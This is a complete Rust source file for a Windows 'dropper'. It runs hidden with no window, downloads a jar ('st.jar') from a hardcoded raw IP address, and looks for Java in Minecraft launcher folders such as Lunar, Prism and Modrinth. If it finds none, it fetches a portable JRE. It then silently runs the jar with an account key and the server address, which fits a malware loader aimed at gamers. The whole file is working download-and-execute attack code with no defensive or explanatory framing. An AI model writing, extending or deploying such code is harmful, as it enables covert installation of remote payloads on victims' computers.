// language: Rust, file: dropper/src/main.rs
#![windows_subsystem = "windows"]

use std::ffi::OsStr;
use std::fs;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use walkdir::WalkDir;

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::Networking::WinInet::*;

const KEY: &str = "__ACCOUNT_KEY__";
const SERVER: &str = "http://95.182.96.216"; // HARDCODED HERE
const CREATE_NO_WINDOW: u32 = 0x08000000;

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn log(loader: &Path, msg: &str) {
    let path = loader.join("debug.txt");
    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(f, "{}", msg);
    }
}

fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
    log(loader, &format!("Downloading: {}", url));
    unsafe {
        let agent = to_wide("Mozilla/5.0");
        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_DIRECT, std::ptr::null(), std::ptr::null(), 0);
        if h_internet.is_null() { return false; }

        let url_w = to_wide(url);
        let flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

        let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, flags, 0);
        
        if h_url.is_null() { 
            log(loader, &format!("InternetOpenUrlW failed. Code: {}", GetLastError())); 
            InternetCloseHandle(h_internet); 
            return false; 
        }

        let mut buf = [0u8; 8192];
        let mut bytes_read = 0;
        let mut data = Vec::new();
        while InternetReadFile(h_url, buf.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
            data.extend_from_slice(&buf[..bytes_read as usize]);
        }
        
        let success = fs::write(dest, data).is_ok();
        InternetCloseHandle(h_url);
        InternetCloseHandle(h_internet);
        success
    }
}

fn extract_zip(zip_path: &Path, out_dir: &Path, loader: &Path) {
    log(loader, "Extracting zip via tar.exe...");
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = 0;
        
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let cmd_str = format!("tar.exe -xf \"{}\" -C \"{}\"", zip_path.display(), out_dir.display());
        let mut cmd_line = to_wide(&cmd_str);

        CreateProcessW(
            std::ptr::null(), cmd_line.as_mut_ptr(), std::ptr::null(), std::ptr::null(),
            0, CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(), &si, &mut pi
        );
        
        if !pi.hProcess.is_null() {
            WaitForSingleObject(pi.hProcess, 60000); 
            CloseHandle(pi.hProcess);
        }
        if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
    }
}

fn find_java(loader: &Path) -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    
    let paths = vec![
        format!("{}\\.minecraft\\runtime", appdata),
        format!("{}\\.lunarclient\\jre", appdata),
        format!("{}\\.prismlauncher\\java", appdata),
        format!("{}\\com.modrinth.theseus\\meta", appdata),
        format!("{}\\Programs\\Modrinth App", localappdata),
        format!("{}\\Programs\\Eclipse Adoptium", localappdata),
        "C:\\Program Files\\Java".to_string(),
        "C:\\Program Files\\Eclipse Adoptium".to_string(),
    ];

    for base_path in paths {
        let path = Path::new(&base_path);
        if path.exists() {
            for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_name() == "javaw.exe" {
                    log(loader, &format!("Found Java: {:?}", entry.path()));
                    return Some(entry.path().to_path_buf());
                }
            }
        }
    }
    None
}

fn download_jre(loader: &Path) -> Option<PathBuf> {
    let jre_zip = loader.join("jre.zip");
    let jre_dir = loader.join("jre");
    let url = format!("{}/api/downloads/jre.zip", SERVER);

    log(loader, "Java not found. Downloading portable JRE...");
    if !download_file(&url, &jre_zip, loader) {
        log(loader, "Failed to download jre.zip");
        return None;
    }

    let _ = fs::create_dir_all(&jre_dir);
    extract_zip(&jre_zip, &jre_dir, loader);
    let _ = fs::remove_file(&jre_zip);

    for entry in WalkDir::new(&jre_dir).into_iter().filter_map(|e| e.ok()) {
        if entry.file_name() == "javaw.exe" {
            let path = entry.path().to_path_buf();
            log(loader, &format!("Extracted Java found at: {:?}", path));
            return Some(path);
        }
    }
    log(loader, "Failed to find javaw.exe in extracted JRE");
    None
}

fn main() {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let loader = Path::new(&appdata).join("loader");
    let _ = fs::create_dir_all(&loader);
    
    log(&loader, "--- STARTING BOOT.EXE ---");

    let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
    log(&loader, "Wrote key.json");

    let jar_path = loader.join("st.jar");
    let url = format!("{}/api/downloads/st.jar", SERVER);
    
    if !download_file(&url, &jar_path, &loader) || !jar_path.exists() {
        log(&loader, "Failed to download st.jar. Exiting.");
        return;
    }

    let java_exe = match find_java(&loader) {
        Some(p) => p,
        None => match download_jre(&loader) {
            Some(p) => p,
            None => {
                log(&loader, "Could not find or download Java. Exiting.");
                return;
            }
        }
    };

    let java_console_exe = java_exe.with_file_name("java.exe");
    log(&loader, &format!("Launching Java with: {:?}", java_console_exe));

    // Native Rust Command for output redirection
    let out_path = loader.join("java_out.txt");
    if let Ok(out_file) = fs::File::create(&out_path) {
        if let Ok(err_file) = out_file.try_clone() {
            let _ = Command::new(&java_console_exe)
                .arg("-jar")
                .arg(&jar_path)
                .arg(KEY)
                .arg(SERVER)
                .stdout(Stdio::from(out_file))
                .stderr(Stdio::from(err_file))
                .creation_flags(CREATE_NO_WINDOW)
                .spawn();
            
            log(&loader, "Spawned Java successfully.");
        }
    }
}